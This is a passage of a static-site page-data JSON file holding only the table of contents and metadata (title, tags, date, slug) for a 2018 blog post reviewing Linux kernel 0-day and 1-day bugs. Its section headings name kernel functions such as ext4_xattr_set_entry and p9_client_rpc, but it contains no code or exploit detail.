href=\"#tldr\">TL;DR</a></p>\n</li>\n<li>\n<p><a href=\"#founds\">Founds</a></p>\n</li>\n<li>\n<p><a href=\"#targets\">Targets</a></p>\n</li>\n<li>\n<p><a href=\"#1-day-bug\">1-day bug</a></p>\n<ul>\n<li><a href=\"#ext4_xattr_set_entry\">ext4_xattr_set_entry</a></li>\n<li><a href=\"#p9_client_rpc\">p9_client_rpc</a></li>\n<li><a href=\"#mm-stuff\">mm stuff</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#0-day-bug\">0-day bug</a></p>\n<ul>\n<li><a href=\"#bugs\">Bugs</a></li>\n<li><a href=\"#syslog\">syslog</a></li>\n<li><a href=\"#demo\">Demo</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#conclusion\">Conclusion</a></p>\n</li>\n</ul>","fields":{"slug":"/2018-07-20-Modern-Linux-Kernel-0day-Unkind-Exploitations-Review/"},"frontmatter":{"title":"Modern Linux Kernel 0,1-day Unkind-Exploitations Review","date":"Jul 20, 2018","tags":["Security","Linux-Kernel"],"keywords":["0-day","1-day"],"update":"Jul 20, 2018"},"timeToRead":9}},"pageContext":{"slug":"/2018-07-20-Modern-Linux-Kernel-0day-Unkind-Exploitations-Review/","series":[],"lastmod":"2018-07-20"}},"staticQueryHashes":["2027115977","2744905544","694178885"],"slicesMap":{}}